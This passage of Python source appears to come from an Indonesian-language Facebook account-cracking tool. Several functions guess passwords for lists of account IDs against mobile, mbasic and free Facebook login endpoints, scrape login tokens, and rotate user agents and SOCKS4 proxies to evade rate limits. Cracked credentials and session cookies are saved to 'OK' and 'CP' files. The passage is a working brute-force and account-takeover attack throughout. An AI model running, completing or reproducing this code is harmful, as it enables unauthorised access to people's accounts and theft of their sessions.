	ses = requests.Session()
	ug = random.choice(ugen3)
	ua = random.choice(['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36'])
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					#tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					#tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					kuki = convert(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					tree = Tree(f"  ")
					tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{ua}[white] ")
					tree.add(f"\r[purple]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convert(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					tree = Tree(f"  ")
					tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{ua}[white] ")
					tree.add(f"\r[purple]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1
	

	
def crackreg(idf,pwv,nmf):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ug = random.choice(ugen3)
	ua = random.choice(['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'])
	ses = requests.Session()
	prog.update(des,description=f'\r[deep_white]Mobile Reguler [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des) 
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					#tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					#tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					kuki = convert(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					tree = Tree(f"  ")
					tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{ua}[white] ")
					tree.add(f"\r[purple]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convert(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					tree = Tree(f"  ")
					tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{ua}[white] ")
					tree.add(f"\r[purple]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1
#--------------------[ METODE MBASIC ]-----------------#
def crackmbasicdate(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]Basic [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(ugen8)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cros','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/?stype=lo&jlou=AfeHk-CAJvdGaHk4jrPG5UtFn4CKHtir7fjddC1Yn0kMD7n1Kct_NlHp4ILanYLiuOMHerEBIaAAGZpqIronHYoLKX2b3Z4J_2orkzUezPFFPw&smuh=4646&lh=Ac_94l2RFc-vs30xNbg&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="8"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					#tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					#tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					kuki = convert(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					tree = Tree(f"  ")
					tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{ua}[white] ")
					tree.add(f"\r[purple]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convert(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					tree = Tree(f"  ")
					tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{ua}[white] ")
					tree.add(f"\r[purple]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1
	
def crackmbasicreg(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]Basic Reguler [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(ugen8)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cros','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/?stype=lo&jlou=AfeHk-CAJvdGaHk4jrPG5UtFn4CKHtir7fjddC1Yn0kMD7n1Kct_NlHp4ILanYLiuOMHerEBIaAAGZpqIronHYoLKX2b3Z4J_2orkzUezPFFPw&smuh=4646&lh=Ac_94l2RFc-vs30xNbg&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="8"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					#tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					#tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					kuki = convert(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					tree = Tree(f"  ")
					tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{ua}[white] ")
					tree.add(f"\r[purple]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convert(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					tree = Tree(f"  ")
					tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{ua}[white] ")
					tree.add(f"\r[purple]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1

#--------------------[ METODE FREE ]-----------------#
def crackfreedate(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]Free [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(ugen8)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cros','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/?stype=lo&jlou=AfeHk-CAJvdGaHk4jrPG5UtFn4CKHtir7fjddC1Yn0kMD7n1Kct_NlHp4ILanYLiuOMHerEBIaAAGZpqIronHYoLKX2b3Z4J_2orkzUezPFFPw&smuh=4646&lh=Ac_94l2RFc-vs30xNbg&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="8"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','referer': 'https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					#tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					#tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					kuki = convert(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					tree = Tree(f"  ")
					tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{ua}[white] ")
					tree.add(f"\r[purple]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convert(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					tree = Tree(f"  ")
					tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{ua}[white] ")
					tree.add(f"\r[purple]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
